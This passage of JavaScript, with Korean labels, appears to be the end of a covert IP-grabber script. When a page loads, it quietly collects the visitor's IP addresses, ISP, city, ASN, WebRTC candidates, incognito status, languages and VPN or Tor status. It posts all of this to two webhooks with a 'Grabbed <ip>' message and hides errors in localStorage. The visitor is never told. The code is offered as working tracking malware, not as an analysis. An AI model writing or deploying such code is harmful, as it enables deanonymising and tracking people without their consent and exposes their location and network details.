                        `**의심 수준:** ${visitorInfo.vpnDetection.suspicionLevel}% ${visitorInfo.vpnDetection.suspicionLevel >= 60 ? '🔴' : visitorInfo.vpnDetection.suspicionLevel >= 40 ? '🟡' : '🟢'}\n` +
                        `**위험도:** ${visitorInfo.vpnDetection.riskLevel.toUpperCase()}\n` +
                        `**신뢰도:** ${visitorInfo.vpnDetection.confidence}%\n` +
                        `**VPN 감지:** ${visitorInfo.vpnDetection.isVPN ? '✅ 예' : '❌ 아니오'}\n` +
                        `**Tor 감지:** ${visitorInfo.vpnDetection.isTor ? '✅ 예' : '❌ 아니오'}\n` +
                        `**프록시 감지:** ${visitorInfo.vpnDetection.isProxy ? '✅ 예' : '❌ 아니오'}\n` +
                        `**데이터센터:** ${visitorInfo.vpnDetection.isDatacenter ? '✅ 예' : '❌ 아니오'}`,
                    inline: false
                },
                {
                    name: "📋 탐지 증거 및 이유",
                    value: (visitorInfo.vpnDetection.reasons?.length || 0) > 0
                        ? '• ' + visitorInfo.vpnDetection.reasons.slice(0, 10).join('\n• ')
                        : '✅ 정상 연결 (이상 없음)',
                    inline: false
                },
                {
                    name: "기본 정보",
                    value:
                        `**주 IP:** ${visitorInfo.ip || 'N/A'} (IPv${visitorInfo.ipVersion === 'IPv4' ? '4' : visitorInfo.ipVersion === 'IPv6' ? '6' : '?'})\n` +
                        `**IPv4:** ${visitorInfo.ipInfo?.ipv4 || 'N/A'}\n` +
                        `**IPv6:** ${visitorInfo.ipInfo?.ipv6 || 'N/A'}\n` +
                        `**ISP:** ${visitorInfo.location?.isp || 'N/A'}`,
                    inline: false
                },
                {
                    name: "위치 정보",
                    value:
                        `**국가:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n` +
                        `**지역:** ${visitorInfo.location?.region || 'N/A'}\n` +
                        `**도시:** ${visitorInfo.location?.city || 'N/A'}\n` +
                        `**시간대:** ${visitorInfo.timezoneInfo.timezone}`,
                    inline: false
                },
                {
                    name: "네트워크 정보",
                    value:
                        `**네트워크 타입:** ${visitorInfo.network.networkCategory || 'N/A'}\n` +
                        `**원시 type:** ${visitorInfo.network.type || 'N/A'}`,
                    inline: false
                },
                {
                    name: "WebRTC IP 후보",
                    value:
                        `**차단 여부:** ${visitorInfo.webRTC.blocked}\n` +
                        `**메인 IP:** ${visitorInfo.ip || 'N/A'}\n` +
                        `**IPv4:** ${visitorInfo.ipInfo?.ipv4 || 'N/A'}\n` +
                        `**IPv6:** ${visitorInfo.ipInfo?.ipv6 || 'N/A'}`,
                    inline: false
                },
                {
                    name: "🔐 보안 및 프라이버시",
                    value:
                        `**Do Not Track:** ${visitorInfo.securityInfo?.doNotTrack || 'N/A'}\n` +
                        `**쿠키:** ${visitorInfo.securityInfo?.cookieEnabled || 'N/A'}\n` +
                        `**시크릿 모드:** ${visitorInfo.securityInfo?.incognito || 'N/A'}`,
                    inline: false
                },
                {
                    name: "🌍 언어 및 지역 설정",
                    value:
                        `**주 언어:** ${visitorInfo.languageInfo?.primaryLanguage || 'N/A'}\n` +
                        `**사용 언어:** ${visitorInfo.languageInfo?.languages || 'N/A'}\n` +
                        `**플랫폼:** ${visitorInfo.languageInfo?.platform || 'N/A'}`,
                    inline: false
                },
                {
                    name: "📅 방문 기록",
                    value:
                        `**첫 방문:** ${visitorInfo.visitTracking?.isFirstVisit || 'N/A'}\n` +
                        `**방문 횟수:** ${visitorInfo.visitTracking?.visitCount || 0}회`,
                    inline: false
                },
                {
                    name: "🌐 추가 IP 정보",
                    value:
                        `**ASN:** ${visitorInfo.location?.asn || 'N/A'}\n` +
                        `**조직:** ${visitorInfo.location?.org || 'N/A'}\n` +
                        `**연결 타입:** ${visitorInfo.location?.connection_type || 'N/A'}\n` +
                        `**모바일 네트워크:** ${visitorInfo.location?.mobile || 'N/A'}`,
                    inline: false
                },
                {
                    name: "접속 정보",
                    value: `**URL:** ${visitorInfo.url}\n**리퍼러:** ${visitorInfo.referrer}`,
                    inline: false
                }
            ],
            footer: { text: `자동 수집 시스템 | 탐지 신뢰도: ${visitorInfo.vpnDetection.confidence}%` }
        };

        // 메시지 내용 생성 (riskLevel 기반)
        function getContentMessage(ip, detection) {
            const riskEmoji = {
                critical: '🔴',
                high: '🟠',
                medium: '🟡',
                low: '🟢',
                none: '✅'
            };
            
            const riskText = {
                critical: '**[CRITICAL]**',
                high: '**[HIGH RISK]**',
                medium: '**[MEDIUM]**',
                low: '**[LOW RISK]**',
                none: ''
            };
            
            const emoji = riskEmoji[detection.riskLevel] || '✅';
            const text = riskText[detection.riskLevel] || '';
            
            // 특별 케이스
            if (detection.isTor) {
                return `Grabbed \`${ip}\` by <@1173942304927645786> 🔴 **[TOR 네트워크 감지!]** (신뢰도: ${detection.confidence}%)`;
            } else if (detection.isVPN && detection.riskLevel === 'critical') {
                return `Grabbed \`${ip}\` by <@1173942304927645786> 🔴 **[VPN 확실!]** (신뢰도: ${detection.confidence}%)`;
            }
            
            return `Grabbed \`${ip}\` by <@1173942304927645786> ${emoji} ${text}`;
        }

        const contentMessage = getContentMessage(
            visitorInfo.ip || "Unknown IP",
            visitorInfo.vpnDetection
        );
        
        const payload = { 
            content: contentMessage,
            embeds: [embed] 
        };
        
        try { localStorage.setItem('debug_step11', 'Sending webhooks...'); } catch (e) {}
        
        // 웹훅 전송 (병렬, 에러 무시)
        try {
            await Promise.allSettled([
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(err => {
                    try { localStorage.setItem('debug_webhook1_error', err.toString()); } catch (e) {}
                }),
                fetch(WEBHOOK_URL_2, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(err => {
                    try { localStorage.setItem('debug_webhook2_error', err.toString()); } catch (e) {}
                })
            ]);
            
            try { 
                localStorage.setItem('debug_step12', 'Webhooks sent'); 
                localStorage.setItem('last_webhook_sent', new Date().toISOString());
            } catch (e) {}
        } catch (webhookError) {
            try { localStorage.setItem('webhook_error', webhookError.toString()); } catch (e) {}
        }
        
    } catch (error) {
        console.error('정보 수집/전송 실패:', error);
        try { 
            localStorage.setItem('collect_error', error.toString());
            localStorage.setItem('collect_error_stack', error.stack || 'No stack');
        } catch (e) {}
    }
}

window.addEventListener('load', collectAndSendInfo);
